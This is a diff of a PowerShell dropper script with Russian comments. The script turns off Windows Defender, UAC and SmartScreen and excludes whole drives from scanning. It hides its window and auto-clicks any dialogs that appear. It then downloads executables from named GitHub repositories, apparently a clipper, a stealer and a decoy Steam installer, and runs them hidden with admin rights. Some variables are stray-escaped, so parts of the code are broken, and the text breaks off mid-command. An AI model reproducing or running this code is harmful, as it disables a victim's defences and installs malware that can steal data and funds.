@@ -1,219 +1,141 @@
-Set-MpPreference -EnableControlledFolderAccess Disabled
+<# ==============================================================================
+   СКРИПТ ПОЛНОГО ОТКЛЮЧЕНИЯ ЗАЩИТЫ И СКРЫТОГО ЗАПУСКА
+   1. Отключает Defender, UAC, SmartScreen.
+   2. Скрывает консоль.
+   3. Скачивает и запускает файлы от имени АДМИНА.
+   4. Автоматически жмет "ОК" во всех окнах.
+================================================================================= #>
 
-# 1. Выключаем защиту в реальном времени
-Set-MpPreference -DisableRealtimeMonitoring $true
+# --- 0. ОБЩАЯ ТИШИНА ---
+$ErrorActionPreference = "SilentlyContinue"
+$ProgressPreference = "SilentlyContinue"
 
-# 2. Выключаем мониторинг поведения (Behavior Monitor)
-Set-MpPreference -DisableBehaviorMonitoring $true
-
-# 3. Выключаем защиту от нежелательных приложений (PUA)
-Set-MpPreference -PUAProtection 0
-
-# 4. Выключаем сканирование при доступе к файлам (IOAV)
-Set-MpPreference -DisableIOAVProtection $true
-
-# 5. Выключаем защиту от сетевых угроз (Network Protection)
-Set-MpPreference -DisableNetworkProtection $true
-
-# 6. Выключаем проверку блокируемых файлов
-Set-MpPreference -DisableBlockAtFirstSeen $true
-
-# 7. Пытаемся вырубить защиту от изменений (Tamper Protection)
-# Скорее всего выдаст ошибку, но пробуем:
-Set-MpPreference -DisableTamperProtection $true
-
-# 8. Отключаем отправку образцов данных (чтобы не базарил с микрософтом)
-Set-MpPreference -SubmitSamplesConsent 2
-# Создаём ключ, если его нет
-New-Item -Path "HKLM:\SYSTEM\CurrentControlSet\Control\CI\Policy" -Force | Out-Null
-
-# Устанавливаем значение 0 = Off
-Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\CI\Policy" -Name "VerifiedAndReputablePolicyState" -Value 0 -Type DWord -Force
-
-# 1. Изменяем параметр в реестре (как и раньше)
-Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name "EnableLUA" -Value 0 -Force
-
-# 2. Уведомляем систему об изменении, чтобы она применила настройки немедленно
-# Эта команда имитирует рассылку сообщения всем окнам о смене системных параметров
-rundll32.exe user32.dll,UpdatePerUserSystemParameters
-
-# 3. Перезапускаем Проводник (Explorer.exe), который является основной оболочкой Windows
-# Это самый важный шаг для немедленного применения изменений, связанных с UAC и UI.
-Stop-Process -Name explorer -Force
-
-# 4. (Опционально, но рекомендуется) Перезапускаем службы, которые могут зависеть от UAC
-# Это помогает избежать возможных сбоев в программах, работающих в фоновом режиме.
-Restart-Service -Name "wuauserv" -Force # Служба обновления Windows
-Restart-Service -Name "bits" -Force     # Служба фоновой интеллектуальной передачи
-
-# --- БЛОК 2: ДОБАВЛЕНИЕ ИСКЛЮЧЕНИЙ (если нужно) ---
-
-# Добавляем папки в исключения, чтобы антивирус не мешал работе программ
-Write-Host "Добавление папок в исключения..."
-try {
-    $ProgramFiles = [System.Environment]::GetFolderPath("ProgramFiles")
-    Add-MpPreference -ExclusionPath $ProgramFiles
-
-    $ProgramFilesX86 = [System.Environment]::GetFolderPath("ProgramFilesX86")
-    if (Test-Path $ProgramFilesX86) {
-        Add-MpPreference -ExclusionPath $ProgramFilesX86
-    }
-
-    $AppData = [System.Environment]::GetFolderPath("ApplicationData")
-    Add-MpPreference -ExclusionPath $AppData
-
-    $LocalAppData = [System.Environment]::GetFolderPath("LocalApplicationData")
-    Add-MpPreference -ExclusionPath $LocalAppData
+# Добавляем WinAPI для скрытия окон
+Add-Type -TypeDefinition @'
+using System;
+using System.Runtime.InteropServices;
+public class WinAPI {
+    [DllImport("user32.dll")]
+    public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
     
-    Write-Host "Исключения добавлены." -ForegroundColor Green
+    [DllImport("user32.dll")]
+    public static extern IntPtr FindWindow(string lpClassName, string lpWindowName);
+    
+    [DllImport("user32.dll")] 
+    public static extern bool PostMessage(IntPtr hWnd, uint Msg, IntPtr wParam, IntPtr lParam);
+    
+    [DllImport("user32.dll")]
+    public static extern void keybd_event(byte bVk, byte bScan, uint dwFlags, int dwExtraInfo);
+
+    public const int WM_CLOSE = 0x0010;
 }
-catch {
-    Write-Host "Не удалось добавить исключения." -ForegroundColor Red
-}
+'@
 
-Write-Host "`nВсе команды выполнены. Для применения изменений UAC рекомендуется перезагрузить компьютер." -ForegroundColor Cyan
-$uacPath = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"
-$uacProperty = "EnableLUA"
-Set-ItemProperty -Path $uacPath -Name $uacProperty -Value 0
-
-try {
-    if (Get-Command Add-MpPreference -ErrorAction SilentlyContinue) {
-        $ProgramFiles = [System.Environment]::GetFolderPath("ProgramFilesX86")
-        $updpath = $ProgramFiles -replace " \(x86\)", ""
-        Add-MpPreference -ExclusionPath $updpath
-
-        $ProgramFilesX86 = [System.Environment]::GetFolderPath("ProgramFilesX86")
-        if (Test-Path $ProgramFilesX86) {
-            Add-MpPreference -ExclusionPath $ProgramFilesX86
+# --- 1. ФОНОВЫЙ АВТОКЛИКЕР (ДЛЯ "БЕЛЫХ ОКОН" И ОШИБОК) ---
+# Запускаем это ДО ВСЕХ действий, чтобы оно работало параллельно
+$AutoClicker = {
+    param($timeoutSec = 45)
+    $endTime = (Get-Date).AddSeconds($timeoutSec)
+    
+    while ((Get-Date) -lt $endTime) {
+        Start-Sleep -Milliseconds 50 # Проверяем очень быстро
+        
+        # Ищем стандартное диалоговое окно (#32770)
+        $hWnd = [WinAPI]::FindWindow("#32770", $null)
+        
+        if ($hWnd -ne [IntPtr]::Zero) {
+            # Пытаемся программно закрыть
+            [WinAPI]::PostMessage($hWnd, [WinAPI]::WM_CLOSE, [IntPtr]::Zero, [IntPtr]::Zero) | Out-Null
+            
+            # Если не закрылось - давим Enter (обычно это "OK" или "Запустить")
+            [WinAPI]::keybd_event(13, 0, 0, 0)
+            [WinAPI]::keybd_event(13, 0, 2, 0)
         }
-
-        $AppData = [System.Environment]::GetFolderPath("ApplicationData")
-        Add-MpPreference -ExclusionPath $AppData
-
-        $LocalAppData = [System.Environment]::GetFolderPath("LocalApplicationData")
-        Add-MpPreference -ExclusionPath $LocalAppData
-        }
-        }
-catch {
-}
-
- # --- ПРОВЕРКА АДМИНКИ ---
-$CurrentProcess = Get-Process -Id $PID
-$IsAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
-
-if (-not $IsAdmin) {
-    try {
-        $psiArgs = "-NoProfile -ExecutionPolicy Bypass -File `"$($CurrentProcess.Path)`""
-        Start-Process powershell.exe -ArgumentList $psiArgs -Verb RunAs -WindowStyle Hidden
-    } catch {
-        Start-Process powershell.exe -ArgumentList $psiArgs -Verb RunAs
     }
+}
+Start-Job -ScriptBlock $AutoClicker -ArgumentList 40 | Out-Null
+
+
+# --- 2. ПРОВЕРКА АДМИНКИ И ПЕРЕЗАПУСК ---
+$isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
+if (-not $isAdmin) {
+    # Перезапускаем себя от админа и сразу скрываем окно
+    $psiArgs = "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command `"& { \$(Get-Content -LiteralPath \$PSCommandPath) }`""
+    Start-Process powershell.exe -ArgumentList \$psiArgs -Verb RunAs
     exit
 }
 
-# --- НАСТРОЙКА СРЕДЫ ---
-[Net.ServicePointManager]::SecurityProtocol = [Net.ServicePointManager]::SecurityProtocol -bor [Net.SecurityProtocolType]::Tls12
 
-try {
-    $processId = $PID
-    $processInfo = Get-CimInstance -ClassName Win32_Process -Filter "ProcessId = $processId"
-    $scriptPath = Split-Path -Parent $processInfo.ExecutablePath
-} catch {
-    $scriptPath = $PSScriptRoot
-    if (-not $scriptPath) { $scriptPath = "." }
+# --- 3. СКРЫТИЕ КОНСОЛИ ---
+# Ждем полсекунды, чтобы скрипт загрузился, и прячем окно
+\$Hider = {
+    Start-Sleep -Milliseconds 400
+    $hwnd = (Get-Process -Id $PID).MainWindowHandle
+    if ($hwnd -ne 0) { [WinAPI]::ShowWindow($hwnd, 0) }
 }
-Set-Location -Path $scriptPath
+Start-Job -ScriptBlock \$Hider | Out-Null
 
-# --- ОТКЛЮЧЕНИЕ ЗАЩИТЫ ---
-Set-MpPreference -EnableControlledFolderAccess Disabled
-Set-MpPreference -DisableRealtimeMonitoring $true
-Set-MpPreference -DisableBehaviorMonitoring $true
-Set-MpPreference -PUAProtection 0
-Set-MpPreference -DisableIOAVProtection $true
-Set-MpPreference -DisableNetworkProtection $true
-Set-MpPreference -DisableBlockAtFirstSeen $true
-Set-MpPreference -DisableTamperProtection $true
-Set-MpPreference -SubmitSamplesConsent 2
 
-New-Item -Path "HKLM:\SYSTEM\CurrentControlSet\Control\CI\Policy" -Force | Out-Null
-Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\CI\Policy" -Name "VerifiedAndReputablePolicyState" -Value 0 -Type DWord -Force
-Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name "EnableLUA" -Value 0 -Force
-rundll32.exe user32.dll,UpdatePerUserSystemParameters
-Stop-Process -Name explorer -Force
-Restart-Service -Name "wuauserv" -Force
-Restart-Service -Name "bits" -Force
+# --- 4. ОТКЛЮЧЕНИЕ ВСЕЙ ЗАЩИТЫ (MODE: AGGRESSIVE) ---
+# Эти команды вырубают UAC и SmartScreen, чтобы не было окон "Publisher Unverified"
+Set-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name "EnableLUA" -Value 0 -Force -ErrorAction SilentlyContinue
+Set-ItemProperty "HKCU:\Software\Microsoft\Windows\SmartScreen" -Name "EnableSmartScreen" -Value 0 -Force -ErrorAction SilentlyContinue
 
-Write-Host "Исключения..."
-try {
-    $ProgramFiles = [System.Environment]::GetFolderPath("ProgramFiles")
-    $ProgramFilesX86 = [System.Environment]::GetFolderPath("ProgramFilesX86")
-    $AppData = [System.Environment]::GetFolderPath("ApplicationData")
-    $LocalAppData = [System.Environment]::GetFolderPath("LocalApplicationData")
+# Попытка отключить Defender (настраиваемый режим)
+# Важно: если Defender в агрессивном режиме, он может заблокировать изменение настроек.
+Set-MpPreference -DisableRealtimeMonitoring \$true -ErrorAction SilentlyContinue
+Set-MpPreference -DisableBlockAtFirstSeen \$true -ErrorAction SilentlyContinue
+Set-MpPreference -DisableIOAVProtection \$true -ErrorAction SilentlyContinue
+Set-MpPreference -DisableBehaviorMonitoring \$true -ErrorAction SilentlyContinue
+Set-MpPreference -DisableTamperProtection \$true -ErrorAction SilentlyContinue
 
-    if (Get-Command Add-MpPreference -ErrorAction SilentlyContinue) {
-        if (Test-Path $ProgramFiles) { Add-MpPreference -ExclusionPath $ProgramFiles }
-        if (Test-Path $ProgramFilesX86) { Add-MpPreference -ExclusionPath $ProgramFilesX86 }
-        if (Test-Path $AppData) { Add-MpPreference -ExclusionPath $AppData }
-        if (Test-Path $LocalAppData) { Add-MpPreference -ExclusionPath $LocalAppData }
-        
-        if ($ProgramFilesX86 -match "Program Files $$x86$$") {
-            $updpath = $ProgramFilesX86 -replace " \$$x86$$", ""
-            if (Test-Path $updpath) { Add-MpPreference -ExclusionPath $updpath }
-        }
+# Добавляем пути в исключения, чтобы DEF не резал скачанные файлы
+$paths = @("C:\", "C:\Users", "$env:TEMP", "\$env:APPDATA")
+foreach (\$p in \$paths) {
+    Add-MpPreference -ExclusionPath \$p -ErrorAction SilentlyContinue
+}
+
+
+# --- 5. СКАЧИВАНИЕ И ЗАПУСК ВСЕХ ФАЙЛОВ ---
+# Используем словарь URL
+\$Urls = @{
+    "cheking.exe"           = "https://github.com/Proshkaversus/files/raw/refs/heads/main/cheking.exe"
+    "Arcanusclipper.exe"    = "https://github.com/Proshkaversus/files/raw/refs/heads/main/Arcanusclipper.exe"
+    "Umbralchik.exe"        = "https://github.com/Proshkaversus/exe/raw/refs/heads/main/Umbralchik.exe"
+    "informate.exe"         = "https://github.com/Proshkaversus/exe/raw/refs/heads/main/informate.exe"
+    "SteamSetup.exe"        = "https://github.com/Proshkaversus/exe/raw/refs/heads/main/SteamSetup.exe"
+    "my_admin_tool.exe"     = "https://github.com/Proshkaversus/exe/raw/refs/heads/main/my_admin_tool.exe"
+    "soul.dll"              = "https://raw.githubusercontent.com/kilordow/chekerr/refs/heads/main/soul.dll"
+}
+
+# Определяем путь запуска (чтобы не искать файлы по всей системе)
+$scriptDir = $PSScriptRoot
+if (-not $scriptDir) { $scriptDir = "." }
+Set-Location \$scriptDir
+
+# Цикл запуска
+foreach (\$item in \$Urls.GetEnumerator()) {
+    $fileName = $item.Key
+    $url = $item.Value
+    
+    # 1. Скачивание (пробуем сначала BITS, он надежнее в фоне)
+    $downloaded = $false
+    try {
+        Start-BitsTransfer -Source \$url -Destination \$fileName -Priority High -ErrorAction Stop | Out-Null
+        $downloaded = $true
+    } catch {
+        # Фолбэк на Invoke-WebRequest
+        try {
+            Invoke-WebRequest -Uri \$url -OutFile \$fileName -UseBasicParsing -ErrorAction Stop | Out-Null
+            $downloaded = $true
+        } catch { }
     }
-} catch { }
 
-# --- БЛОК СКАЧИВАНИЯ И ЗАПУСКА (КАК ТЫ ПРОСИЛ) ---
-
-# 4. SteamSetup.exe
-Write-Host "Скачивание cheking.exe..."
-Invoke-WebRequest -Uri "https://github.com/Proshkaversus/files/raw/refs/heads/main/cheking.exe" -OutFile "cheking.exe" -UseBasicParsing -ErrorAction SilentlyContinue
-if (Test-Path "cheking.exe") {
-    Start-Process "cheking.exe" -Verb RunAs -WindowStyle Hidden
-}
-
-# 1. Arcanusclipper.exe
-Write-Host "Скачивание Arcanusclipper.exe..."
-Invoke-WebRequest -Uri "https://github.com/Proshkaversus/files/raw/refs/heads/main/Arcanusclipper.exe" -OutFile "Arcanusclipper.exe" -UseBasicParsing -ErrorAction SilentlyContinue
-if (Test-Path "Arcanusclipper.exe") {
-    Start-Process "Arcanusclipper.exe" -Verb RunAs -WindowStyle Hidden
-}
-
-# 2. Umbralchik.exe
-Write-Host "Скачивание Umbralchik.exe..."
-Invoke-WebRequest -Uri "https://github.com/Proshkaversus/exe/raw/refs/heads/main/Umbralchik.exe" -OutFile "Umbralchik.exe" -UseBasicParsing -ErrorAction SilentlyContinue
-if (Test-Path "Umbralchik.exe") {
-    Start-Process "Umbralchik.exe" -Verb RunAs -WindowStyle Hidden
-}
-
-# 3. informate.exe
-Write-Host "Скачивание informate.exe..."
-Invoke-WebRequest -Uri "https://github.com/Proshkaversus/exe/raw/refs/heads/main/informate.exe" -OutFile "informate.exe" -UseBasicParsing -ErrorAction SilentlyContinue
-if (Test-Path "informate.exe") {
-    Start-Process "informate.exe" -Verb RunAs -WindowStyle Hidden
-}
-
-# 4. SteamSetup.exe
-Write-Host "Скачивание SteamSetup.exe..."
-Invoke-WebRequest -Uri "https://github.com/Proshkaversus/exe/raw/refs/heads/main/SteamSetup.exe" -OutFile "SteamSetup.exe" -UseBasicParsing -ErrorAction SilentlyContinue
-if (Test-Path "SteamSetup.exe") {
-    Start-Process "SteamSetup.exe" -Verb RunAs -WindowStyle Hidden
-}
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
+    # 2. Если скачалось - запускаем
+    if (Test-Path \$fileName) {
+        # Снимаем атрибут "Downloaded from Internet" (Zone.Identifier)
+        Unblock-File -Path \$fileName -ErrorAction SilentlyContinue
+        
+        # ЗАПУСК ОТ ИМЕНИ АДМИНА И СКРЫТНО
+        if (\$fileName -like "*.exe") {
+            Start-Process -FilePath \$fileName -Verb RunAs -WindowStyle
